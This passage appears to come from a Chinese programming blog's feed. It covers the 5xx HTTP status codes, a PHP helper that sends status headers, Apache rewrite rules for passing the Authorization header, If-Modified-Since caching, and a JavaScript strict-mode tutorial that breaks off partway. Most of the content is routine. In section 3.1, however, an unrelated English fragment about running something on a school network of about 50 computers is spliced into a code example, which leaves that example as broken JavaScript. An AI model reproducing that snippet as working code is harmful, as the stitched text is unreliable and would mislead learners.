<td align="left">服务器遇到了一个未曾预料的状况，导致了它无法完成对请求的处理。一般来说，这个问题都会在服务器的程序码出错时出现。</td>
</tr>
<tr>
<td align="left">501</td>
<td align="left">服务器不支持当前请求所需要的某个功能。当服务器无法识别请求的方法，并且无法支持其对任何资源的请求。</td>
</tr>
<tr>
<td align="left">502</td>
<td align="left">作为网关或者代理工作的服务器尝试执行请求时，从上游服务器接收到无效的响应。</td>
</tr>
<tr>
<td align="left">503</td>
<td align="left">由于临时的服务器维护或者过载，服务器当前无法处理请求。这个状况是临时的，并且将在一段时间以后恢复。如果能够预计延迟时间，那么响应中可以包含一个 Retry-After 头用以标明这个延迟时间。如果没有给出这个 Retry-After 信息，那么客户端应当以处理500响应的方式处理它。 注意：503状态码的存在并不意味着服务器在过载的时候必须使用它。某些服务器只不过是希望拒绝客户端的连接。</td>
</tr>
<tr>
<td align="left">504</td>
<td align="left">作为网关或者代理工作的服务器尝试执行请求时，未能及时从上游服务器（URI标识出的服务器，例如HTTP、FTP、LDAP）或者辅助服务器（例如DNS）收到响应。 注意：某些代理服务器在DNS查询超时时会返回400或者500错误</td>
</tr>
<tr>
<td align="left">505</td>
<td align="left">服务器不支持，或者拒绝支持在请求中使用的 HTTP 版本。这暗示着服务器不能或不愿使用与客户端相同的版本。响应中应当包含一个描述了为何版本不被支持以及服务器支持哪些协议的实体。</td>
</tr>
<tr>
<td align="left">506</td>
<td align="left">由《透明内容协商协议》（RFC 2295）扩展，代表服务器存在内部配置错误：被请求的协商变元资源被配置为在透明内容协商中使用自己，因此在一个协商处理中不是一个合适的重点。</td>
</tr>
<tr>
<td align="left">507</td>
<td align="left">服务器无法存储完成请求所必须的内容。这个状况被认为是临时的。WebDAV (RFC 4918)</td>
</tr>
<tr>
<td align="left">509</td>
<td align="left">服务器达到带宽限制。这不是一个官方的状态码，但是仍被广泛使用。</td>
</tr>
<tr>
<td align="left">510</td>
<td align="left">获取资源所需要的策略并没有没满足。（RFC 2774）</td>
</tr>
</tbody></table>
<h3 id="DEMO"><a href="#DEMO" class="headerlink" title="DEMO"></a>DEMO</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">send_http_status(<span class="number">404</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">* HTTP Protocol defined status codes</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">* HTTP协议状态码,调用函数时候只需要将$num赋予一个下表中的已知值就直接会返回状态了。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> int $num</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">send_http_status</span><span class="params">($num)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    $http = <span class="keyword">array</span> (</span><br><span class="line"></span><br><span class="line">        <span class="number">100</span> =&gt; <span class="string">"HTTP/1.1 100 Continue"</span>,</span><br><span class="line"></span><br><span class="line">        <span class="number">101</span> =&gt; <span class="string">"HTTP/1.1 101 Switching Protocols"</span>,</span><br><span class="line"></span><br><span class="line">        <span class="number">200</span> =&gt; <span class="string">"HTTP/1.1 200 OK"</span>,</span><br><span class="line"></span><br><span class="line">        <span class="number">201</span> =&gt; <span class="string">"HTTP/1.1 201 Created"</span>,</span><br><span class="line"></span><br><span class="line">        <span class="number">202</span> =&gt; <span class="string">"HTTP/1.1 202 Accepted"</span>,</span><br><span class="line"></span><br><span class="line">        <span class="number">203</span> =&gt; <span class="string">"HTTP/1.1 203 Non-Authoritative Information"</span>,</span><br><span class="line"></span><br><span class="line">        <span class="number">204</span> =&gt; <span class="string">"HTTP/1.1 204 No Content"</span>,</span><br><span class="line"></span><br><span class="line">        <span class="number">205</span> =&gt; <span class="string">"HTTP/1.1 205 Reset Content"</span>,</span><br><span class="line"></span><br><span class="line">        <span class="number">206</span> =&gt; <span class="string">"HTTP/1.1 206 Partial Content"</span>,</span><br><span class="line"></span><br><span class="line">        <span class="number">300</span> =&gt; <span class="string">"HTTP/1.1 300 Multiple Choices"</span>,</span><br><span class="line"></span><br><span class="line">        <span class="number">301</span> =&gt; <span class="string">"HTTP/1.1 301 Moved Permanently"</span>,</span><br><span class="line"></span><br><span class="line">        <span class="number">302</span> =&gt; <span class="string">"HTTP/1.1 302 Found"</span>,</span><br><span class="line"></span><br><span class="line">        <span class="number">303</span> =&gt; <span class="string">"HTTP/1.1 303 See Other"</span>,</span><br><span class="line"></span><br><span class="line">        <span class="number">304</span> =&gt; <span class="string">"HTTP/1.1 304 Not Modified"</span>,</span><br><span class="line"></span><br><span class="line">        <span class="number">305</span> =&gt; <span class="string">"HTTP/1.1 305 Use Proxy"</span>,</span><br><span class="line"></span><br><span class="line">        <span class="number">307</span> =&gt; <span class="string">"HTTP/1.1 307 Temporary Redirect"</span>,</span><br><span class="line"></span><br><span class="line">        <span class="number">400</span> =&gt; <span class="string">"HTTP/1.1 400 Bad Request"</span>,</span><br><span class="line"></span><br><span class="line">        <span class="number">401</span> =&gt; <span class="string">"HTTP/1.1 401 Unauthorized"</span>,</span><br><span class="line"></span><br><span class="line">        <span class="number">402</span> =&gt; <span class="string">"HTTP/1.1 402 Payment Required"</span>,</span><br><span class="line"></span><br><span class="line">        <span class="number">403</span> =&gt; <span class="string">"HTTP/1.1 403 Forbidden"</span>,</span><br><span class="line"></span><br><span class="line">        <span class="number">404</span> =&gt; <span class="string">"HTTP/1.1 404 Not Found"</span>,</span><br><span class="line"></span><br><span class="line">        <span class="number">405</span> =&gt; <span class="string">"HTTP/1.1 405 Method Not Allowed"</span>,</span><br><span class="line"></span><br><span class="line">        <span class="number">406</span> =&gt; <span class="string">"HTTP/1.1 406 Not Acceptable"</span>,</span><br><span class="line"></span><br><span class="line">        <span class="number">407</span> =&gt; <span class="string">"HTTP/1.1 407 Proxy Authentication Required"</span>,</span><br><span class="line"></span><br><span class="line">        <span class="number">408</span> =&gt; <span class="string">"HTTP/1.1 408 Request Time-out"</span>,</span><br><span class="line"></span><br><span class="line">        <span class="number">409</span> =&gt; <span class="string">"HTTP/1.1 409 Conflict"</span>,</span><br><span class="line"></span><br><span class="line">        <span class="number">410</span> =&gt; <span class="string">"HTTP/1.1 410 Gone"</span>,</span><br><span class="line"></span><br><span class="line">        <span class="number">411</span> =&gt; <span class="string">"HTTP/1.1 411 Length Required"</span>,</span><br><span class="line"></span><br><span class="line">        <span class="number">412</span> =&gt; <span class="string">"HTTP/1.1 412 Precondition Failed"</span>,</span><br><span class="line"></span><br><span class="line">        <span class="number">413</span> =&gt; <span class="string">"HTTP/1.1 413 Request Entity Too Large"</span>,</span><br><span class="line"></span><br><span class="line">        <span class="number">414</span> =&gt; <span class="string">"HTTP/1.1 414 Request-URI Too Large"</span>,</span><br><span class="line"></span><br><span class="line">        <span class="number">415</span> =&gt; <span class="string">"HTTP/1.1 415 Unsupported Media Type"</span>,</span><br><span class="line"></span><br><span class="line">        <span class="number">416</span> =&gt; <span class="string">"HTTP/1.1 416 Requested range not satisfiable"</span>,</span><br><span class="line"></span><br><span class="line">        <span class="number">417</span> =&gt; <span class="string">"HTTP/1.1 417 Expectation Failed"</span>,</span><br><span class="line"></span><br><span class="line">        <span class="number">500</span> =&gt; <span class="string">"HTTP/1.1 500 Internal Server Error"</span>,</span><br><span class="line"></span><br><span class="line">        <span class="number">501</span> =&gt; <span class="string">"HTTP/1.1 501 Not Implemented"</span>,</span><br><span class="line"></span><br><span class="line">        <span class="number">502</span> =&gt; <span class="string">"HTTP/1.1 502 Bad Gateway"</span>,</span><br><span class="line"></span><br><span class="line">        <span class="number">503</span> =&gt; <span class="string">"HTTP/1.1 503 Service Unavailable"</span>,</span><br><span class="line"></span><br><span class="line">        <span class="number">504</span> =&gt; <span class="string">"HTTP/1.1 504 Gateway Time-out"</span></span><br><span class="line"></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    header($http[$num]);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>PHP</category>
      </categories>
  </entry>
  <entry>
    <title>HTTP_AUTHORIZATION</title>
    <url>/articles/HTTP-AUTHORIZATION/</url>
    <content><![CDATA[<p>做接口认证的时候，我们常会采用<code>Http BearerAuth</code>认证方式，即请求时在Header带上Authorization参数：</p>
<blockquote>
<p>Authorization: Bearer your_token</p>
</blockquote>
<p>我们都知道php的自定义头信息都可以使用<code>$SERVER[&#39;HTTP*&#39;]</code>来获取, 如 “Cookie: BAIDUID=B86A8A0FF:”, 获取的时候，我们可以使用<code>$_SERVER[&#39;HTTP_COOKIE&#39;]</code>来获取。</p>
<p>但<code>Authorization</code>是个例外，在<code>Apache服务器</code>下会出现<code>$_SERVER[&#39;HTTP_AUTHORIZATION&#39;]</code> 获取不到值的问题.</p>
<p>解决方法如下: </p>
<ul>
<li>如果已经开启<code>rewrite_module</code>模块，需要在<code>httpd-vhosts.conf</code>模块下</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">&lt;VirtualHost *:80&gt;</span><br><span class="line">    ServerName test.com</span><br><span class="line">    DocumentRoot <span class="string">"/data/www/"</span></span><br><span class="line">    &lt;Directory  <span class="string">"/data/www/"</span>&gt;</span><br><span class="line">        <span class="comment"># Laravel配置</span></span><br><span class="line">        Options Indexes FollowSymLinks</span><br><span class="line">		AllowOverride All</span><br><span class="line">		Order Deny,Allow</span><br><span class="line">		Require all granted</span><br><span class="line">		RewriteEngine On</span><br><span class="line">		RewriteCond %&#123;REQUEST_FILENAME&#125; !-d</span><br><span class="line">		RewriteCond %&#123;REQUEST_FILENAME&#125; !-f</span><br><span class="line">		RewriteRule ^ index.php [L]</span><br><span class="line">		<span class="comment"># HTTP 基础认证需要添加下面两行</span></span><br><span class="line">		RewriteCond %&#123;HTTP:Authorization&#125; ^(.+)$</span><br><span class="line">		RewriteRule .* - [E=HTTP_AUTHORIZATION:%&#123;HTTP:Authorization&#125;]</span><br><span class="line">    &lt;/Directory&gt;</span><br><span class="line">&lt;/VirtualHost&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>如果没有开启<code>rewrite_module</code>模块，需要在入口处添加<code>.htaccess</code>文件，内容如下:</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Options +FollowSymlinks -Multiviews</span><br><span class="line">RewriteEngine On</span><br><span class="line"><span class="comment">#Authorization Headers</span></span><br><span class="line">RewriteCond %&#123;HTTP:Authorization&#125; ^(.+)$</span><br><span class="line">RewriteRule .* - [E=HTTP_AUTHORIZATION:%&#123;HTTP:Authorization&#125;]</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>PHP</category>
      </categories>
  </entry>
  <entry>
    <title>HTTP的请求头标签 If-Modified-Since</title>
    <url>/articles/HTTP%E7%9A%84%E8%AF%B7%E6%B1%82%E5%A4%B4%E6%A0%87%E7%AD%BE-If-Modified-Since/</url>
    <content><![CDATA[<p>大家都知道客户端浏览器是有缓存的，里面存放之前访问过的一些网页文件。例如IE，会把缓存文件存到“C:\Documents and Settings\用户名\Local Settings\Temporary Internet Files”这样类似的目录里。其实缓存里存储的不只是网页文件，还有服务器发过来的该文件的最后服务器修改时间。</p>
<p><code>If-Modified-Since</code>是标准的HTTP请求头标签，在发送HTTP请求时，把浏览器端缓存页面的最后修改时间一起发到服务器去，服务器会把这个时间与服务器上实际文件的最后修改时间进行比较:</p>
<ul>
<li><p>如果时间一致，那么返回HTTP状态码304（不返回文件内容），客户端接到之后，就直接把本地缓存文件显示到浏览器中。</p>
</li>
<li><p>如果时间不一致，就返回HTTP状态码200和新的文件内容，客户端接到之后，会丢弃旧文件，把新文件缓存起来，并显示到浏览器中。</p>
</li>
</ul>
<p>下面用一个简单的小例子说明一下。</p>
<p>由于演示例子需要截取HTTP Request和Response的信息，我在这里使用的工具是Fiddler(<a href="https://www.telerik.com/fiddler" target="_blank" rel="noopener">点击下载</a>)。</p>
<p>1.首先在服务器创建一个简单的HTML文件，用浏览器访问一下，成功表示HTML页面。Fiddler就会产生下面的捕获信息。</p>
<p>需要留意的是</p>
<p>（1）因为是第一次访问该页面，客户端发请求时，请求头中没有If-Modified-Since标签。</p>
<p>（2）服务器返回的HTTP状态码是200，并发送页面的全部内容。</p>
<p>（3）服务器返回的HTTP头标签中有Last-Modified，告诉客户端页面的最后修改时间。</p>
<p><img src="/articles/HTTP的请求头标签-If-Modified-Since/0.png" alt> </p>
<p>2.在浏览器中刷新一下页面，Fiddler就会产生下面的捕获信息。</p>
<p>需要注意的是</p>
<p>（1）客户端发HTTP请求时，使用If-Modified-Since标签，把上次服务器告诉它的文件最后修改时间返回到服务器端了。</p>
<p>（2）因为文件没有改动过，所以服务器返回的HTTP状态码是304，没有发送页面的内容。</p>
<p><img src="/articles/HTTP的请求头标签-If-Modified-Since/1.png" alt></p>
<p>3.用文本编辑器稍微改动一下页面文件，保存。再用浏览器访问一下，Fiddler就会产生下面的捕获信息。</p>
<p>需要留意的是</p>
<p>（1）客户端发HTTP请求时，使用If-Modified-Since标签，把上次服务器告诉它的文件最后修改时间返回到服务器端了。</p>
<p>（2）因为文件被改动过，两边时间不一致，所以服务器返回的HTTP状态码是200，并发送新页面的全部内容。</p>
<p>（3）服务器返回的HTTP头标签中有Last-Modified，告诉客户端页面的新的最后修改时间。</p>
<p><img src="/articles/HTTP的请求头标签-If-Modified-Since/2.png" alt></p>
<p>HTTP的If-Modified-Since头标签与客户端缓存相互配合，大大节约了网络流量。</p>
]]></content>
      <categories>
        <category>PHP</category>
      </categories>
  </entry>
  <entry>
    <title>Javascript 严格模式详解</title>
    <url>/articles/Javascript%20%E4%B8%A5%E6%A0%BC%E6%A8%A1%E5%BC%8F%E8%AF%A6%E8%A7%A3/</url>
    <content><![CDATA[<h4 id="一、概述"><a href="#一、概述" class="headerlink" title="一、概述"></a>一、概述</h4><p>除了正常运行模式，ECMAscript 5添加了第二种运行模式：<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Strict_mode" target="_blank" rel="noopener">“严格模式”</a>（strict mode）。顾名思义，这种模式使得Javascript在更严格的条件下运行。</p>
<p>设立”严格模式”的目的，主要有以下几个：</p>
<ul>
<li><p>消除Javascript语法的一些不合理、不严谨之处，减少一些怪异行为;</p>
</li>
<li><p>消除代码运行的一些不安全之处，保证代码运行的安全；</p>
</li>
<li><p>提高编译器效率，增加运行速度；</p>
</li>
<li><p>为未来新版本的Javascript做好铺垫。</p>
</li>
</ul>
<p>“严格模式”体现了Javascript更合理、更安全、更严谨的发展方向，包括IE 10在内的主流浏览器，都已经<a href="http://kangax.github.io/compat-table/es5/" target="_blank" rel="noopener">支持</a>它，许多大项目已经开始全面拥抱它。</p>
<p>另一方面，同样的代码，在”严格模式”中，可能会有不一样的运行结果；一些在”正常模式”下可以运行的语句，在”严格模式”下将不能运行。掌握这些内容，有助于更细致深入地理解Javascript，让你变成一个更好的程序员。</p>
<p>本文将对”严格模式”做详细介绍。</p>
<h4 id="二、进入标志"><a href="#二、进入标志" class="headerlink" title="二、进入标志"></a>二、进入标志</h4><p>进入”严格模式”的标志，是下面这行语句：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="meta">"use strict"</span>;</span><br></pre></td></tr></table></figure>

<p>老版本的浏览器会把它当作一行普通字符串，加以忽略。</p>
<h4 id="三、如何调用"><a href="#三、如何调用" class="headerlink" title="三、如何调用"></a>三、如何调用</h4><p>“严格模式”有两种调用方法，适用于不同的场合。</p>
<h5 id="3-1-针对整个脚本文件"><a href="#3-1-针对整个脚本文件" class="headerlink" title="3.1 针对整个脚本文件"></a>3.1 针对整个脚本文件</h5><p>将”use strict”放在脚本文件的第一行，则整个脚本都将以”严格模式”运行。如果这行语句不在第一行，则无效，整个脚本以”正常模式”运行。如果不同模式的代码文件合并成一个文件，这一点需要特别注意。</p>
<p>(严格地说，只要前面不是产生实际运行结果的语句，”use strict”可以不在第一行，比如直接跟在一个空的分号后面。)</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="meta">"use strict"</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"这是严格模式。"</span>);</span><br></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="string">"这是正常模式。"</span>);kly, it<span class="string">'s almost 2 years ago now. I can admit it now - I run it on my school'</span>s network that has about <span class="number">50</span> computers.</span><br></pre></td></tr></table></figure>

<p>上面的代码表示，一个网页中依次有两段Javascript代码。前一个script标签是严格模式，后一个不是。</p>
<h5 id="3-2-针对单个函数"><a href="#3-2-针对单个函数" class="headerlink" title="3.2 针对单个函数"></a>3.2 针对单个函数</h5><p>将”use strict”放在函数体的第一行，则整个函数以”严格模式”运行。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">strict</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="meta">    "use strict"</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"这是严格模式。"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">notStrict</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"这是正常模式。"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="3-3-脚本文件的变通写法"><a href="#3-3-脚本文件的变通写法" class="headerlink" title="3.3 脚本文件的变通写法"></a>3.3 脚本文件的变通写法</h5><p>因为第一种调用方法不利于文件合并，所以更好的做法是，借用第二种方法，将整个脚本文件放在一个立即执行的匿名函数之中。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">    "use strict"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// some code here</span></span><br><span class="line"></span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>

<h4 id="四、语法和行为改变"><a href="#四、语法和行为改变" class="headerlink" title="四、语法和行为改变"></a>四、语法和行为改变</h4><p>严格模式对Javascript的语法和行为，都做了一些改变。</p>
<h5 id="4-1-全局变量显式声明"><a href="#4-1-全局变量显式声明" class="headerlink" title="4.1 全局变量显式声明"></a>4.1 全局变量显式声明</h5><p>在正常模式中，如果一个变量没有声明就赋值，默认是全局变量。严格模式禁止这种用法，全局变量必须显式声明。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="meta">"use strict"</span>;</span><br><span class="line"></span><br><span class="line">v = <span class="number">1</span>; <span class="comment">// 报错，v未声明</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">2</span>; i++) &#123; <span class="comment">// 报错，i未声明</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因此，严格模式下，变量都必须先用var命令声明，然后再使用。</p>
<h5 id="4-2-静态绑定"><a href="#4-2-静态绑定" class="headerlink" title="4.2 静态绑定"></a>4.2 静态绑定</h5><p>Javascript语言的一个特点，就是允许”动态绑定”，即某些属性和方法到底属于哪一个对象，不是在编译时确定的，而是在运行时（runtime）确定的。</p>
<p>严格模式对动态绑定做了一些限制。某些情况下，只允许静态绑定。也就是说，属性和方法到底归属哪个对象，在编译阶段就确定。这样做有利于编译效率的提高，也使得代码更容易阅读，更少出现意外。</p>
<p>具体来说，涉及以下几个方面。</p>
<p>（1）禁止使用with语句</p>
<p>因为with语句无法在编译时就确定，属性到底归属哪个对象。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="meta">"use strict"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> v = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> (o)&#123; <span class="comment">// 语法错误</span></span><br><span class="line">    v = <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>（2）创设eval作用域</p>
<p>正常模式下，Javascript语言有两种变量作用域（scope）：全局作用域和函数作用域。严格模式创设了第三种作用域：eval作用域。</p>
<p>正常模式下，eval语句的作用域，取决于它处于全局作用域，还是处于函数作用域。严格模式下，eval语句本身就是一个作用域，不再能够生成全局变量了，它所生成的变量只能用于eval内部。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">"use strict"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> x = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.info(<span class="built_in">eval</span>(<span class="string">"var x = 5; x"</span>)); <span class="comment">// 5</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.info(x); <span class="comment">// 2</span></span><br></pre></td></tr></table></figure>

<h5 id="4-3-增强的安全措施"><a href="#4-3-增强的安全措施" class="headerlink" title="4.3 增强的安全措施"></a>4.3 增强的安全措施</h5><p>（1）禁止this关键字指向全局对象</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> !<span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 返回false，因为"this"指向全局对象，"!this"就是false</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">    "use strict"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> !<span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>// 返回true，因为严格模式下，this的值为undefined，所以”!this”为true。</p>
<p>因此，使用构造函数时，如果忘了加new，this不再指向全局对象，而是报错。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">    "use strict"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">this</span>.a = <span class="number">1</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">f();<span class="comment">// 报错，this未定义</span></span><br></pre></td></tr></table></figure>

<p>（2）禁止在函数内部遍历调用栈</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f1</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">    "use strict"</span>;</span><br><span class="line"></span><br><span class="line">    f1.caller; <span class="comment">// 报错</span></span><br><span class="line"></span><br><span class="line">    f1.arguments; <span class="comment">// 报错</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">f1();</span><br></pre></td></tr></table></figure>

<h5 id="4-4-禁止删除变量"><a href="#4-4-禁止删除变量" class="headerlink" title="4.4 禁止删除变量"></a>4.4 禁止删除变量</h5><p>严格模式下无法删除变量。只有configurable设置为true的对象属性，才能被删除。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="meta">"use strict"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> x;</span><br><span class="line"></span><br><span class="line"><span class="keyword">delete</span> x; <span class="comment">// 语法错误</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> o = <span class="built_in">Object</span>.create(<span class="literal">null</span>, &#123;<span class="string">'x'</span>: &#123;</span><br><span class="line"></span><br><span class="line">    value: <span class="number">1</span>,</span><br><span class="line"></span><br><span class="line">    configurable: <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">&#125;&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">delete</span> o.x; <span class="comment">// 删除成功</span></span><br></pre></td></tr></table></figure>

<h5 id="4-5-显式报错"><a href="#4-5-显式报错" class="headerlink" title="4.5 显式报错"></a>4.5 显式报错</h5><p>正常模式下，对一个对象的只读属性进行赋值，不会报错，只会默默地失败。严格模式下，将报错。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="meta">"use strict"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> o = &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.defineProperty(o, <span class="string">"v"</span>, &#123; <span class="attr">value</span>: <span class="number">1</span>, <span class="attr">writable</span>: <span class="literal">false</span> &#125;);</span><br><span class="line"></span><br><span class="line">o.v = <span class="number">2</span>; <span class="comment">// 报错</span></span><br></pre></td></tr></table></figure>

<p>严格模式下，对一个使用getter方法读取的属性进行赋值，会报错。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="meta">"use strict"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> o = &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">get</span> v() &#123; <span class="keyword">return</span> <span class="number">1</span>; &#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">o.v = <span class="number">2</span>; <span class="comment">// 报错</span></span><br></pre></td></tr></table></figure>

<p>严格模式下，对禁止扩展的对象添加新属性，会报错。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="meta">"use strict"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> o = &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.preventExtensions(o);</span><br><span class="line"></span><br><span class="line">o.v = <span class="number">1</span>; <span class="comment">// 报错</span></span><br></pre></td></tr></table></figure>

<p>严格模式下，删除一个不可删除的属性，会报错。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="meta">"use strict"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">delete</span> <span class="built_in">Object</span>.prototype; <span class="comment">// 报错</span></span><br></pre></td></tr></table></figure>

<h5 id="4-6-重名错误"><a href="#4-6-重名错误" class="headerlink" title="4.6 重名错误"></a>4.6 重名错误</h5><p>严格模式新增了一些语法错误。</p>
<p>（1）对象不能有重名的属性</p>
<p>正常模式下，如果对象有多个重名属性，最后赋值的那个属性会覆盖前面的值。严格模式下，这属于语法错误。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="meta">"use strict"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> o = &#123;</span><br><span class="line"></span><br><span class="line">    p: <span class="number">1</span>,</span><br><span class="line"></span><br><span class="line">    p: <span class="number">2</span></span><br><span class="line"></span><br><span class="line">&#125;; <span class="comment">// 语法错误</span></span><br></pre></td></tr></table></figure>

<p>（2）函数不能有重名的参数</p>
<p>正常模式下，如果函数有多个重名的参数，可以用arguments[i]读取。严格模式下，这属于语法错误。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="meta">"use strict"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">a, a, b</span>) </span>&#123; <span class="comment">// 语法错误</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="4-7-禁止八进制表示法"><a href="#4-7-禁止八进制表示法" class="headerlink" title="4.7 禁止八进制表示法"></a>4.7 禁止八进制表示法</h5><p>正常模式下，整数的第一位如果是0，表示这是八进制数，比如0100等于十进制的64。严格模式禁止这种表示法，整数第一位为0，将报错。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="meta">"use strict"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> n = <span class="number">0100</span>; <span class="comment">// 语法错误</span></span><br></pre></td></tr></table></figure>

<h5 id="4-8-arguments对象的限制"><a href="#4-8-arguments对象的限制" class="headerlink" title="4.8 arguments对象的限制"></a>4.8 arguments对象的限制</h5><p>arguments是函数的参数对象，严格模式对它的使用做了限制。</p>
<p>（1）不允许对arguments赋值</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="meta">"use strict"</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">arguments</span>++; <span class="comment">// 语法错误</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj = &#123; <span class="keyword">set</span> p(arguments) &#123; &#125; &#125;; <span class="comment">// 语法错误</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123; &#125; <span class="keyword">catch</span> (<span class="built_in">arguments</span>) &#123; &#125; <span class="comment">// 语法错误</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">arguments</span>(<span class="params"></span>) </span>&#123; &#125; <span class="comment">// 语法错误</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> f = <span class="keyword">new</span> <span class="built_in">Function</span>(<span class="string">"arguments"</span>, <span class="string">"'use strict'; return 17;"</span>); <span class="comment">// 语法错误</span></span><br></pre></td></tr></table></figure>

<p>（2）arguments不再追踪参数的变化</p>
